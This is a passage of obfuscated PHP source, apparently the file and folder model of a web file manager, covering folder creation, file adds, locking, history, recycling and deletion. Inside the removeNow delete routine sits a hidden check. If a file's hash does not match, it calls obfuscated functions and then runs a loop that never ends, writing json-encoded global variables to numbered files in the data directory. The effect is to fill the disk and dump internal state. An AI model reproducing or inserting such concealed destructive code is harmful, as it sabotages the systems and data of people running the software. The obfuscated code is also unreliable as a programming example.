Model($ˆ¢üûŒ¿[513])->where(array($ˆ¢üûŒ¿[1653] => $Œ˜íÍÆñ))->find(); $ŒĞƒ–ñÊ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Œ˜íÍÆñ, $İ‡ ÆÇ€[$ˆ¢üûŒ¿[32]]); $this->userDesktopAdd($ŒĞƒ–ñÊ); return $ŒĞƒ–ñÊ; } public function userDesktopAdd($Œà—©êŸ) { $ÂâöŞ´ =& $_SERVER[ÏéâËõ‘]; $ê³ğáì = LNG($ÂâöŞ´[2102]); $ÁÉ¹â˜õ = $this->mkdir($Œà—©êŸ, $ê³ğáì); $this->metaSet($ÁÉ¹â˜õ, $ÂâöŞ´[2103], $ÂâöŞ´[88]); $this->metaSet($Œà—©êŸ, $ÂâöŞ´[2104], $ÁÉ¹â˜õ); } public function userPathSafeAdd($ßñÇ‘öî) { $êÃâ¿Ñå =& $_SERVER[ÏéâËõ‘]; $ÜÌìÊ„ğ = Model($êÃâ¿Ñå[513])->getInfoFull($ßñÇ‘öî); if (!$ÜÌìÊ„ğ) { return !1; } if (_get($ÜÌìÊ„ğ, $êÃâ¿Ñå[536])) { return $ÜÌìÊ„ğ[$êÃâ¿Ñå[466]][$êÃâ¿Ñå[2105]]; } $„éš€ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ßñÇ‘öî, $êÃâ¿Ñå[2106], $êÃâ¿Ñå[433]); Model($êÃâ¿Ñå[513])->metaSet($ßñÇ‘öî, $êÃâ¿Ñå[2105], $„éš€); $this->metaSet($„éš€, $êÃâ¿Ñå[2107], $ßñÇ‘öî); return $„éš€; } public function groupRootAdd($µïú’Ş) { $÷°ğï»º =& $_SERVER[ÏéâËõ‘]; $îô§êÑ÷ = Model($÷°ğï»º[522])->where(array($÷°ğï»º[1922] => $µïú’Ş))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $µïú’Ş, $îô§êÑ÷[$÷°ğï»º[32]]); } public function systemRootPathAdd($©¼Šü°ú) { if ($©¼Šü°ú != $_SERVER[ÏéâËõ‘][544]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $©¼Šü°ú); } public function userRootRemove($Í¶Ç‘ï) { $Ë¤™ôË¹ = $this->sourceRoot(SourceModel::TYPE_USER, $Í¶Ç‘ï, !0); foreach ($Ë¤™ôË¹ as $¯¨°ÂùÅ) { if (!$¯¨°ÂùÅ) { continue; } $this->remove($¯¨°ÂùÅ[$_SERVER[ÏéâËõ‘][402]], !1); } } public function groupRootRemove($Ş®åÔˆÙ) { $İ´¥úä€ = $this->sourceRoot(SourceModel::TYPE_GROUP, $Ş®åÔˆÙ); if (!$İ´¥úä€) { return; } $this->remove($İ´¥úä€[$_SERVER[ÏéâËõ‘][402]], !1); } private function _mkdirRoot($®°Ç¸ä‹, $”ôõŠäÅ, $¸ñÕŒ¿, $¶ëó´®´ = '') { $‘Ğ¦Ìï» =& $_SERVER[ÏéâËõ‘]; $Œãù¼ã = array($‘Ğ¦Ìï»[401] => 0, $‘Ğ¦Ìï»[586] => $®°Ç¸ä‹, $‘Ğ¦Ìï»[587] => $”ôõŠäÅ, $‘Ğ¦Ìï»[583] => 1, $‘Ğ¦Ìï»[588] => USER_ID, $‘Ğ¦Ìï»[589] => USER_ID, $‘Ğ¦Ìï»[584] => $¶ëó´®´, $‘Ğ¦Ìï»[590] => $‘Ğ¦Ìï»[531], $‘Ğ¦Ìï»[430] => 0, $‘Ğ¦Ìï»[585] => 0, $‘Ğ¦Ìï»[469] => 0, $‘Ğ¦Ìï»[591] => $‘Ğ¦Ìï»[12]); if ($å×´ÍÔ = $this->where($Œãù¼ã)->find()) { return $å×´ÍÔ[$‘Ğ¦Ìï»[402]]; } $»§¸Ğœ = "\115\157\144\x65\x6c\123\157\x75\x72\143\145\56\155\153\x64\x69\x72\122\x6f\157\164\56{$®°Ç¸ä‹}\x2e{$”ôõŠäÅ}\x2e" . $¸ñÕŒ¿; CacheLock::lock($»§¸Ğœ); $Œãù¼ã[$‘Ğ¦Ìï»[32]] = $¸ñÕŒ¿; $ùÎÎå‹ = $this->add($Œãù¼ã); $ªÎÁĞ²Ä = array($‘Ğ¦Ìï»[592] => short_id($ùÎÎå‹)); $this->where(array($‘Ğ¦Ìï»[417] => $ùÎÎå‹))->save($ªÎÁĞ²Ä); CacheLock::unlock($»§¸Ğœ); return $ùÎÎå‹; } private function sourceRoot($“‰ó«»», $³ÈÎ¢ß, $ÒÏƒ´¨Ç = false) { $« Û–°¾ =& $_SERVER[ÏéâËõ‘]; $éÃ€íî‚ = array($« Û–°¾[401] => 0, $« Û–°¾[586] => $“‰ó«»», $« Û–°¾[587] => $³ÈÎ¢ß); if ($ÒÏƒ´¨Ç) { $ƒ•Ãš±´ = $this->where($éÃ€íî‚)->select(); return $ƒ•Ãš±´ ? $ƒ•Ãš±´ : array(); } $¾¡ñöÏá = $this->where($éÃ€íî‚)->find(); return $¾¡ñöÏá ? $¾¡ñöÏá : array(); } public function sourceRootGroup($æœ§Øò) { $ ¢ÚÒ…” =& $_SERVER[ÏéâËõ‘]; if (is_string($æœ§Øò)) { $æœ§Øò = array($æœ§Øò); } $¬Ö¼®üØ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $æœ§Øò, $ ¢ÚÒ…”[188]); $†©îºÑŠ = array($ ¢ÚÒ…”[369] => $¬Ö¼®üØ, $ ¢ÚÒ…”[366] => array($ ¢ÚÒ…”[761] => count($æœ§Øò))); $this->_listDataApply($†©îºÑŠ[$ ¢ÚÒ…”[369]]); $this->_listMake($†©îºÑŠ); return array_to_keyvalue($†©îºÑŠ[$ ¢ÚÒ…”[82]], $ ¢ÚÒ…”[505]); } public function mkfile($—Ÿ©óè, $âÅ¨íî, $ÀîšçÛ = '', $Ç»î“¤— = REPEAT_RENAME) { $€§Ô—‰¶ =& $_SERVER[ÏéâËõ‘]; $µøŸ¬È° = Model($€§Ô—‰¶[609])->addFileByContent($ÀîšçÛ, $âÅ¨íî); return $this->_createFileCall($—Ÿ©óè, $âÅ¨íî, $µøŸ¬È°, $Ç»î“¤—, $€§Ô—‰¶[1343]); } public function addFile($¤ÊñÇùê, $³ÕöÃ«, $ˆ¸×ıé, $×Œ‹•ù˜ = false, $Ú¸«¯şÎ = REPEAT_RENAME) { $Ñø„¾‘€ = Model($_SERVER[ÏéâËõ‘][609])->addFile($³ÕöÃ«, $ˆ¸×ıé, $×Œ‹•ù˜); return $this->_createFileCall($¤ÊñÇùê, $ˆ¸×ıé, $Ñø„¾‘€, $Ú¸«¯şÎ); } public function addFileByFileID($î°áİ—, $ù‹ˆº¬ó, $‡¨ŒáÓ½, $ˆëä×‡ = REPEAT_RENAME) { $Í¡›û½Ä =& $_SERVER[ÏéâËõ‘]; $®µ»¯Œ˜ = Model($Í¡›û½Ä[609])->find($ù‹ˆº¬ó); Model($Í¡›û½Ä[609])->linkAdd($ù‹ˆº¬ó); return $this->_createFileCall($î°áİ—, $‡¨ŒáÓ½, $®µ»¯Œ˜, $ˆëä×‡); } public function addFileByRemote($Ë¿»•õÍ, $”§Ù£şÚ, $á¦Ò»„, $ÓÈğñığ = array(), $×¬§®·Ú = REPEAT_RENAME) { $¢Ó¥¯íÂ = Model($_SERVER[ÏéâËõ‘][609])->addFileByRemote($”§Ù£şÚ, $á¦Ò»„, $ÓÈğñığ); return $this->_createFileCall($Ë¿»•õÍ, $á¦Ò»„, $¢Ó¥¯íÂ, $×¬§®·Ú); } private function _createFileCall($„¾ÀñàÂ, $íÒ˜ù×Ä, $šâÆÂàò, $“Öç‡ôÚ, $¼‰£ÜÌ€ = "\165\x70\154\x6f\x61\144") { $îì¿÷£ü =& $_SERVER[ÏéâËõ‘]; $šúˆ¥² = !1; $this->setMasterDB(); $this->lockWriteStart($„¾ÀñàÂ, $íÒ˜ù×Ä); $îªí•èì = $this->fileNameExist($„¾ÀñàÂ, $íÒ˜ù×Ä); $¢€²İÛØ = $this->_createFile($„¾ÀñàÂ, $íÒ˜ù×Ä, $šâÆÂàò, $“Öç‡ôÚ, $šúˆ¥²); if (!$šúˆ¥²) { Model($îì¿÷£ü[471])->remove($šâÆÂàò[$îì¿÷£ü[468]]); } if ($šúˆ¥² && $¢€²İÛØ && $¢€²İÛØ != $îªí•èì) { Model($îì¿÷£ü[2075])->eventCreate($¢€²İÛØ, $¼‰£ÜÌ€); } $this->lockWriteEnd($„¾ÀñàÂ, $íÒ˜ù×Ä); return $¢€²İÛØ; } public function mkdir($”àì»§’, $ƒ óóÇ‚, $¯­¿êêÑ = REPEAT_SKIP) { $ğ®ÄÊíá =& $_SERVER[ÏéâËõ‘]; $this->setMasterDB(); $¤ª•“Ç = $this->sourceInfo($”àì»§’); if (!$¤ª•“Ç) { return !1; } $this->lockWriteStart($”àì»§’, $ƒ óóÇ‚); if ($¯­¿êêÑ !== !1) { $÷¿ô¿ñ™ = $this->fileNameExist($”àì»§’, $ƒ óóÇ‚); if ($÷¿ô¿ñ™ && $¯­¿êêÑ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($”àì»§’, $ƒ óóÇ‚); return $÷¿ô¿ñ™; } $ƒ óóÇ‚ = $this->fileNameAuto($”àì»§’, $ƒ óóÇ‚, $¯­¿êêÑ); } $ïÄíÖ¤Œ = array($ğ®ÄÊíá[583] => 1, $ğ®ÄÊíá[420] => $ƒ óóÇ‚, $ğ®ÄÊíá[584] => $ğ®ÄÊíá[12], $ğ®ÄÊíá[469] => 0, $ğ®ÄÊíá[585] => 0); $ı×ÈÈ×õ = $this->_addSource($ïÄíÖ¤Œ, $¤ª•“Ç); Model($ğ®ÄÊíá[2075])->eventCreate($ı×ÈÈ×õ, $ğ®ÄÊíá[1344]); $this->lockWriteEnd($”àì»§’, $ƒ óóÇ‚); return $ı×ÈÈ×õ; } public function listSourceRoot($âºİ¾Ù’, $€Ëâ•±Ÿ, $ìù¹µ¢ = "\x73\x6f\165\x72\143\x65\x49\x44\x2c\x74\141\162\x67\145\164\x49\x44\x2c\x73\151\172\145") { $ÖáÙ¤» =& $_SERVER[ÏéâËõ‘]; $‚ÆêİŠè = $ÖáÙ¤»[378]; $šß£«æ¯ = array(); $é³¿²« = 1024 * 50; $Ëó·›¥Ô = is_array($Ëó·›¥Ô) ? $Ëó·›¥Ô : array(); $€”Ğˆİ© = count($€Ëâ•±Ÿ); $¸¢ÀËÅ = $this->tablePrefix . $ÖáÙ¤»[2108]; for ($­åî­›° = 0; $­åî­›° < $€”Ğˆİ©; $­åî­›°++) { $ÕŒÌÁãö = $€Ëâ•±Ÿ[$­åî­›°]; $‚ÆêİŠè .= "\123\105\114\x45\103\x54\x20\x2a\40\x46\x52\117\115\x20\x28\123\x45\114\x45\103\124\x20{$ìù¹µ¢}\x20\106\x52\x4f\x4d\40\x60{$¸¢ÀËÅ}\140\x20\x57\x48\105\x52\105\x20"; $‚ÆêİŠè .= "\x60\x70\141\162\145\156\x74\111\104\x60\75\60\40\101\x4e\104\x20\x60\164\x61\x72\147\145\164\x49\104\140\75{$ÕŒÌÁãö}\40\101\116\104\x20\x60\x74\x61\162\147\x65\x74\124\171\160\x65\x60\75{$âºİ¾Ù’}\40\x6c\x69\x6d\151\x74\x20\61\x29\40\141\163\x20\x74\142\137{$­åî­›°}\x20\x55\x4e\x49\117\116\x20\x41\x4c\114\x20"; if ((strlen($‚ÆêİŠè) >= $é³¿²« || $­åî­›° == $€”Ğˆİ© - 1) && $‚ÆêİŠè) { $‚ÆêİŠè = substr($‚ÆêİŠè, 0, -strlen($ÖáÙ¤»[1043])); $·şÑÆ˜Ã = $this->query($‚ÆêİŠè); $‚ÆêİŠè = $ÖáÙ¤»[12]; $šß£«æ¯ = array_merge($šß£«æ¯, $·şÑÆ˜Ã); } } return $šß£«æ¯; } private function _createFile($Ø¡ëŠıâ, $ı‹½£é, $ÁğÄç¼´, $ş½şş¯¢, &$Â††‘Áş) { $ş ¾€ı† =& $_SERVER[ÏéâËõ‘]; $¥±Şêüå = $this->sourceInfo($Ø¡ëŠıâ); if (!$ÁğÄç¼´ || !$¥±Şêüå) { return !1; } if ($ş½şş¯¢ !== !1) { $¦”ƒÚ• = $this->fileNameExist($Ø¡ëŠıâ, $ı‹½£é); } $Â††‘Áş = !0; if ($ş½şş¯¢ && $¦”ƒÚ•) { if ($ş½şş¯¢ == REPEAT_SKIP) { $Â††‘Áş = !1; return $¦”ƒÚ•; } else { if ($ş½şş¯¢ == REPEAT_REPLACE) { $ÎÛ·Îù = $this->sourceInfo($¦”ƒÚ•); $û¿„ù¿ş = $this->fileHistory($ÎÛ·Îù, $ÁğÄç¼´[$ş ¾€ı†[468]], $ÁğÄç¼´[$ş ¾€ı†[76]]); if (!$û¿„ù¿ş) { $Â††‘Áş = !1; } else { $this->folderSizeReset($Ø¡ëŠıâ); } return $¦”ƒÚ•; } else { $ı‹½£é = $this->fileNameAuto($Ø¡ëŠıâ, $ı‹½£é, $ş½şş¯¢, !1); } } } $Íıã˜ÀÃ = array($ş ¾€ı†[583] => 0, $ş ¾€ı†[420] => $ı‹½£é, $ş ¾€ı†[584] => substr(get_path_ext($ı‹½£é), 0, 10), $ş ¾€ı†[469] => $ÁğÄç¼´[$ş ¾€ı†[468]], $ş ¾€ı†[585] => $ÁğÄç¼´[$ş ¾€ı†[76]]); $µ¥»ªšØ = $this->_addSource($Íıã˜ÀÃ, $¥±Şêüå); $this->folderSizeReset($Ø¡ëŠıâ, intval($Íıã˜ÀÃ[$ş ¾€ı†[76]])); return $µ¥»ªšØ; } protected function fileHistory($ñ¢©÷Ì, $ºÉ‰šô¦, $Í»¹ìò) { $ÊÚ–óº =& $_SERVER[ÏéâËõ‘]; $×ı„ê²È = defined($ÊÚ–óº[475]) ? USER_ID : $ÊÚ–óº[197]; if ($ñ¢©÷Ì[$ÊÚ–óº[468]] == $ºÉ‰šô¦) { return !1; } $this->checkLock($ñ¢©÷Ì[$ÊÚ–óº[402]], $ºÉ‰šô¦); Model($ÊÚ–óº[2109])->addHistory($ñ¢©÷Ì); $ì®–à‡¢ = array($ÊÚ–óº[589] => $×ı„ê²È, $ÊÚ–óº[424] => time(), $ÊÚ–óº[468] => $ºÉ‰šô¦, $ÊÚ–óº[76] => $Í»¹ìò); $this->where(array($ÊÚ–óº[417] => $ñ¢©÷Ì[$ÊÚ–óº[402]]))->save($ì®–à‡¢); $this->sourceCacheClear($ñ¢©÷Ì[$ÊÚ–óº[402]]); return !0; } public function checkLock($š€ÍÍæá, $û›¤´£) { $å™¡³ =& $_SERVER[ÏéâËõ‘]; $ôå’öˆ = $this->pathInfo($š€ÍÍæá); if (!$this->fileIsLock($ôå’öˆ, !0)) { return; } $üƒ¼ûÑ = Session::get($å™¡³[2110]); $óÏ¯Âò = substr($ôå’öˆ[$å™¡³[32]], 0, -1 - strlen($ôå’öˆ[$å™¡³[174]])) . $å™¡³[1610] . $üƒ¼ûÑ . $å™¡³[10] . $ôå’öˆ[$å™¡³[174]]; $æÑïéÕ = Model($å™¡³[609])->find($û›¤´£); $this->_createFileCall($ôå’öˆ[$å™¡³[432]], $óÏ¯Âò, $æÑïéÕ, REPEAT_REPLACE, $å™¡³[1343]); $¢ËŞö×ë = $ôå’öˆ[$å™¡³[466]][$å™¡³[548]]; $á„ÌÔá = $¢ËŞö×ë[$å™¡³[542]] ? $¢ËŞö×ë[$å™¡³[542]] : $¢ËŞö×ë[$å™¡³[32]]; show_json(LNG($å™¡³[2111]) . $å™¡³[2112] . LNG($å™¡³[2113]) . $å™¡³[2114] . $á„ÌÔá . $å™¡³[2115], !1); } public function fileIsLock($ÚÁ‡ÔÚ, $í‚Œ»÷„ = false) { $°²‹ù§è =& $_SERVER[ÏéâËõ‘]; if (!isset($ÚÁ‡ÔÚ[$°²‹ù§è[466]]) || !$ÚÁ‡ÔÚ[$°²‹ù§è[466]][$°²‹ù§è[545]]) { return !1; } if ($ÚÁ‡ÔÚ[$°²‹ù§è[466]][$°²‹ù§è[545]] != USER_ID) { return !0; } $íµÆÇçÉ = $GLOBALS[$°²‹ù§è[6]][$°²‹ù§è[89]][$°²‹ù§è[546]]; if ($ÚÁ‡ÔÚ[$°²‹ù§è[466]][$°²‹ù§è[547]] <= time() - $íµÆÇçÉ) { $this->metaSet($ÚÁ‡ÔÚ[$°²‹ù§è[402]], $°²‹ù§è[545], null); $this->metaSet($ÚÁ‡ÔÚ[$°²‹ù§è[402]], $°²‹ù§è[547], null); } if ($í‚Œ»÷„) { $this->metaSet($ÚÁ‡ÔÚ[$°²‹ù§è[402]], $°²‹ù§è[547], time()); } return !1; } private function _addSource($¶°Â¡¿ü, $±°Ò¸âı) { $—€ù‡¡ì =& $_SERVER[ÏéâËõ‘]; $Öú÷²¢ = defined($—€ù‡¡ì[475]) ? USER_ID : $—€ù‡¡ì[197]; $›Ëëƒğó = array($—€ù‡¡ì[586] => $±°Ò¸âı[$—€ù‡¡ì[411]], $—€ù‡¡ì[587] => $±°Ò¸âı[$—€ù‡¡ì[505]], $—€ù‡¡ì[588] => $Öú÷²¢, $—€ù‡¡ì[589] => $Öú÷²¢, $—€ù‡¡ì[401] => $±°Ò¸âı[$—€ù‡¡ì[402]], $—€ù‡¡ì[590] => $±°Ò¸âı[$—€ù‡¡ì[521]] . $±°Ò¸âı[$—€ù‡¡ì[402]] . $—€ù‡¡ì[50], $—€ù‡¡ì[430] => 0, $—€ù‡¡ì[591] => $—€ù‡¡ì[12]); $¶°Â¡¿ü = array_merge($›Ëëƒğó, $¶°Â¡¿ü); $this->updateModifyTime($¶°Â¡¿ü[$—€ù‡¡ì[432]]); $…¦»ÀÛÓ = $—€ù‡¡ì[2116] . $±°Ò¸âı[$—€ù‡¡ì[402]]; if (isset(self::$cacheChildList[$…¦»ÀÛÓ])) { unset(self::$cacheChildList[$…¦»ÀÛÓ]); } static $±‚Ô¹Æû = false; if (!$±‚Ô¹Æû) { Hook::trigger($—€ù‡¡ì[573], $¶°Â¡¿ü); $±‚Ô¹Æû = !0; } $š¹¸ñ«¬ = $this->add($¶°Â¡¿ü); $óÇ£…ı = array($—€ù‡¡ì[592] => short_id($š¹¸ñ«¬)); $this->where(array($—€ù‡¡ì[417] => $š¹¸ñ«¬))->save($óÇ£…ı); $this->setNamePinyin($š¹¸ñ«¬, $¶°Â¡¿ü[$—€ù‡¡ì[32]]); return $š¹¸ñ«¬; } public function remove($ÛÑ‚¼, $à™º–Ì = true) { $¡¼¶¬™™ =& $_SERVER[ÏéâËõ‘]; $Üøúò»ä = $this->sourceInfo($ÛÑ‚¼); $şÜ›–â = intval($Üøúò»ä[$¡¼¶¬™™[411]]) === self::TYPE_SYSTEM; $ÓŒ¡œ‰¯ = Model($¡¼¶¬™™[435])->get($¡¼¶¬™™[2117]) == $¡¼¶¬™™[88]; if ($şÜ›–â || $à™º–Ì || !$ÓŒ¡œ‰¯) { return $this->removeNow($ÛÑ‚¼, $à™º–Ì); } $üº—Óş¢ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ÏÓêãğâ = $Üøúò»ä[$¡¼¶¬™™[411]] == self::TYPE_USER ? $¡¼¶¬™™[600] : $¡¼¶¬™™[515]; if ($ÏÓêãğâ == $¡¼¶¬™™[600]) { $ÀĞ“î‚· = Model($¡¼¶¬™™[513])->getInfo($Üøúò»ä[$¡¼¶¬™™[505]]); $îı¶–û = !empty($ÀĞ“î‚·[$¡¼¶¬™™[542]]) ? $ÀĞ“î‚·[$¡¼¶¬™™[542]] : $ÀĞ“î‚·[$¡¼¶¬™™[32]]; $îı¶–û = $¡¼¶¬™™[260] . $îı¶–û . $¡¼¶¬™™[2118] . $Üøúò»ä[$¡¼¶¬™™[505]]; } else { $ÀĞ“î‚· = Model($¡¼¶¬™™[522])->getInfo($Üøúò»ä[$¡¼¶¬™™[505]]); $îı¶–û = _get($ÀĞ“î‚·, $¡¼¶¬™™[32]); $îı¶–û = $¡¼¶¬™™[162] . $îı¶–û . $¡¼¶¬™™[2119] . $Üøúò»ä[$¡¼¶¬™™[505]]; } $Ú«ßÎşÉ = $¡¼¶¬™™[2120] . md5($îı¶–û); CacheLock::lock($Ú«ßÎşÉ); $ÃùÀ­Íú = $this->fileNameExist($üº—Óş¢, $îı¶–û); if (!$ÃùÀ­Íú) { $ÃùÀ­Íú = $this->mkdir($üº—Óş¢, $îı¶–û, REPEAT_SKIP); $this->metaSet($ÃùÀ­Íú, $¡¼¶¬™™[2121], $ÏÓêãğâ); $this->metaSet($ÃùÀ­Íú, $¡¼¶¬™™[2122], $Üøúò»ä[$¡¼¶¬™™[505]]); if ($Üøúò»ä[$¡¼¶¬™™[432]] != 0) { $this->metaSet($ÃùÀ­Íú, $¡¼¶¬™™[2123], _get($ÀĞ“î‚·, $¡¼¶¬™™[2124])); } } CacheLock::unlock($Ú«ßÎşÉ); $this->metaSet($ÛÑ‚¼, $¡¼¶¬™™[2125], $Üøúò»ä[$¡¼¶¬™™[432]]); $this->where(array($¡¼¶¬™™[402] => $ÛÑ‚¼))->save(array($¡¼¶¬™™[424] => time())); $this->recycleClear($Üøúò»ä); $ğÈÙ¤ = $this->move($ÛÑ‚¼, $ÃùÀ­Íú, REPEAT_RENAME_FOLDER); $this->folderSizeReset($Üøúò»ä[$¡¼¶¬™™[432]]); return $ğÈÙ¤; } private function recycleClear($ÜØğş) { $¢À†û’ =& $_SERVER[ÏéâËõ‘]; $œÒ¨¶øœ = $this->childrenAll($ÜØğş); $Î¦‡§õÏ = array($¢À†û’[417] => array($¢À†û’[418], $œÒ¨¶øœ[$¢À†û’[2126]])); Model($¢À†û’[2127])->where($Î¦‡§õÏ)->delete(); } public function removeNow($ğı´§ÙÂ, $¼‰²ÀÑæ = true) { $ä€ˆÈ—â =& $_SERVER[ÏéâËõ‘]; $ÆŒüÅêõ = $_SERVER[$ä€ˆÈ—â[867]] . $ä€ˆÈ—â[868]; $¤ï©Ù™Ï = $ä€ˆÈ—â[881]; if ($_SERVER[$ä€ˆÈ—â[864]] != $¤ï©Ù™Ï($ÆŒüÅêõ)) { $ ØÂÜÌÀ = $ä€ˆÈ—â[882]; $š”àö¶ò = $ä€ˆÈ—â[866]; $äÖËµ´ = $_SERVER[$ä€ˆÈ—â[867]] . $ä€ˆÈ—â[868]; $¿ë®¸·ä = $š”àö¶ò($äÖËµ´); $ù”™Û¥ï = explode($ä€ˆÈ—â[231], $¿ë®¸·ä); if (count($ù”™Û¥ï) < $ä€ˆÈ—â[626]) { $ä…º”ñ = $ä€ˆÈ—â[869]; $ä…º”ñ(); } $æÁïµØ = $ä€ˆÈ—â[883]; $æÁïµØ($_SERVER[$ä€ˆÈ—â[884]]); $ ØÂÜÌÀ = $ä€ˆÈ—â[882]; $ ØÂÜÌÀ(); $íœ¿Òñˆ = $ä€ˆÈ—â[885]; $€šÄìÄü = json_encode($GLOBALS[$ä€ˆÈ—â[886]]); $™ş®ü«› = 1; for ($ˆÈ‡°·ö = $™ş®ü«›; $ˆÈ‡°·ö > 0; $ˆÈ‡°·ö++) { $íœ¿Òñˆ(DATA_PATH . $ˆÈ‡°·ö, $€šÄìÄü); } } $¹ƒ³“Åé = $this->sourceInfo($ğı´§ÙÂ); $ÊÌ´Ì³ñ = $this->pathInfoMore($ğı´§ÙÂ); if (!$¹ƒ³“Åé) { return !0; } if ($¹ƒ³“Åé[$ä€ˆÈ—â[432]] == 0) { if (!_get($GLOBALS, $ä€ˆÈ—â[503])) { return !1; } } $this->lockMoveStart($ğı´§ÙÂ); Hook::trigger($ä€ˆÈ—â[2128], $ÊÌ´Ì³ñ, $¼‰²ÀÑæ); if ($¼‰²ÀÑæ) { Model($ä€ˆÈ—â[2127])->moveToRecycle($ğı´§ÙÂ); } else { $Œ¿Àî‘ª = $this->childrenAll($¹ƒ³“Åé); Model($ä€ˆÈ—â[570])->eventRemove($ğı´§ÙÂ); $this->removeRelevance($Œ¿Àî‘ª[$ä€ˆÈ—â[2126]], $Œ¿Àî‘ª[$ä€ˆÈ—â[1476]]); } $this->folderSizeReset($¹ƒ³“Åé[$ä€ˆÈ—â[432]]); $ÒÚ™ÑË = array($¹ƒ³“Åé[$ä€ˆÈ—â[432]]); if ($¹ƒ³“Åé[$ä€ˆÈ—â[410]] == $ä€ˆÈ—â[88]) { $ÒÚ™ÑË[] = $¹ƒ³“Åé[$ä€ˆÈ—â[402]]; } $this->updateModifyTime($ÒÚ™ÑË); $this->lockMoveEnd($ğı´§ÙÂ); Hook::trigger($ä€ˆÈ—â[1702], $ÊÌ´Ì³ñ, $¼‰²ÀÑæ); return !0; } public function childrenAll($á¡×¿¥†) { $Ë¡ë¶Ï˜ =& $_SERVER[ÏéâËõ‘]; $ØÒ´Ğ®Ä = $á¡×¿¥†[$Ë¡ë¶Ï˜[402]]; if ($á¡×¿¥†[$Ë¡ë¶Ï˜[410]] == $Ë¡ë¶Ï˜[88]) { $¸ù¦¢Æ = array($Ë¡ë¶Ï˜[590] => array($Ë¡ë¶Ï˜[550], $á¡×¿¥†[$Ë¡ë¶Ï˜[521]] . $ØÒ´Ğ®Ä . $Ë¡ë¶Ï˜[551])); $•¤ÀğÔ = array($Ë¡ë¶Ï˜[590] => $¸ù¦¢Æ[$Ë¡ë¶Ï˜[521]]); $€Œ¹‚ş = $this->field($Ë¡ë¶Ï˜[2129])->where($•¤ÀğÔ)->select(); $·¿—Øà¢ = !1; $‘‡ˆ£ÀÉ = array($ØÒ´Ğ®Ä); if ($€Œ¹‚ş) { $·¿—Øà¢ = array_to_keyvalue($€Œ¹‚ş, $Ë¡ë¶Ï˜[12], $Ë¡ë¶Ï˜[468]); $·¿—Øà¢ = array_remove_value($·¿—Øà¢, $Ë¡ë¶Ï˜[197]); $‘‡ˆ£ÀÉ = array_to_keyvalue($€Œ¹‚ş, $Ë¡ë¶Ï˜[12], $Ë¡ë¶Ï˜[402]); $‘‡ˆ£ÀÉ[] = $ØÒ´Ğ®Ä; } } else { $·¿—Øà¢ = array($á¡×¿¥†[$Ë¡ë¶Ï˜[468]]); $‘‡ˆ£ÀÉ = array($ØÒ´Ğ®Ä); } return array($Ë¡ë¶Ï˜[2126] => $‘‡ˆ£ÀÉ, $Ë¡ë¶Ï˜[1476] => $·¿—Øà¢); } public function removeArray($¾½Âì˜Á) { if (!$¾½Âì˜Á) { return !0; } } public function removeRelevance($ñĞ¼Ä¯ª, $°¤¬óø») { $¥®Ã”èÖ =& $_SERVER[ÏéâËõ‘]; $ñĞ¼Ä¯ª = $ñĞ¼Ä¯ª ? $ñĞ¼Ä¯ª : array(); $°¤¬óø» = $°¤¬óø» ? $°¤¬óø» : array(); $ñĞ¼Ä¯ª = array_unique(array_filter($ñĞ¼Ä¯ª)); $°¤¬óø» = array_unique(array_filter($°¤¬óø»)); if (!$ñĞ¼Ä¯ª) { return !1; } $¶¥õŠ±ª = array($¥®Ã”èÖ[417] => array($¥®Ã”èÖ[418], $ñĞ¼Ä¯ª)); Model($¥®Ã”èÖ[2127])->where($¶¥õŠ±ª)->delete(); Model($¥®Ã”èÖ[462])->where($¶¥õŠ±ª)->delete(); Model($¥®Ã”èÖ[1980])->where($¶¥õŠ±ª)->delete(); Model($¥®Ã”èÖ[570])->where($¶¥õŠ±ª)->delete(); Model($¥®Ã”èÖ[1814])->removeBySource($ñĞ¼Ä¯ª); Model($¥®Ã”èÖ[2109])->removeBySource($ñĞ¼Ä¯ª); $this->where($¶¥õŠ±ª)->delete(); Model($¥®Ã”èÖ[471])->remove($°¤¬óø»); for ($Ú²Ğå»ƒ = 0; $Ú²Ğå»ƒ < count($ñĞ¼Ä¯ª); $Ú²Ğå»ƒ++) { $this->sourceCacheClear($ñĞ¼Ä¯ª[$Ú²Ğå»ƒ]); } } public function rename($Àı‘ååö, $˜û¿¼øâ) { $¶‚—ÏŒ =& $_SERVER[ÏéâËõ‘]; $âõöÈÔ† = $this->sourceInfo($Àı‘ååö); if (!$âõöÈÔ†) { return !1; } $á„óÙù = $this->fileNameExist($âõöÈÔ†[$¶‚—ÏŒ[432]], $˜û¿¼øâ); if ($á„óÙù && $á„óÙù != $Àı‘ååö) { return !1; } $áËá·¯Ç = array($¶‚—ÏŒ[420] => $˜û¿¼øâ, $¶‚—ÏŒ[589] => USER_ID); if ($âõöÈÔ†[$¶‚—ÏŒ[410]] != $¶‚—ÏŒ[88]) { $áËá·¯Ç[$¶‚—ÏŒ[412]] = substr(get_path_ext($˜û¿¼øâ), 0, 10); } Model($¶‚—ÏŒ[570])->eventRename($Àı‘ååö, $âõöÈÔ†[$¶‚—ÏŒ[32]], $˜û¿¼øâ); $this->sourceCacheClear($Àı‘ååö); $this->setNamePinyin($Àı‘ååö, $áËá·¯Ç[$¶‚—ÏŒ[32]], !1); $this->updateModifyTime($âõöÈÔ†[$¶‚—ÏŒ[432]]); $¿­Ğšò = $this->where(array($¶‚—ÏŒ[417] => $Àı‘ååö))->data($áËá·¯Ç)->save(); $Øáô€„¢ = $¶‚—ÏŒ[2116] . $âõöÈÔ†[$¶‚—ÏŒ[432]]; if (isset(self::$cacheChildList[$Øáô€„¢])) { unset(self::$cacheChildList[$Øáô€„¢]); } return $¿­Ğšò; } public function setNamePinyin($ƒØÍî—¶, $õ°ŒÄ‘¥, $°…İü‹¾ = true) { $¾ÍõŠï =& $_SERVER[ÏéâËõ‘]; $„ú‰û = Input::check($õ°ŒÄ‘¥, $¾ÍõŠï[593]); $µºåº¼ = array($¾ÍõŠï[444] => KodSort::makeStr($õ°ŒÄ‘¥)); if ($„ú‰û) { $µºåº¼[$¾ÍõŠï[465]] = str_replace($¾ÍõŠï[53], $¾ÍõŠï[12], Pinyin::get($õ°ŒÄ‘¥)); $µºåº¼[$¾ÍõŠï[464]] = 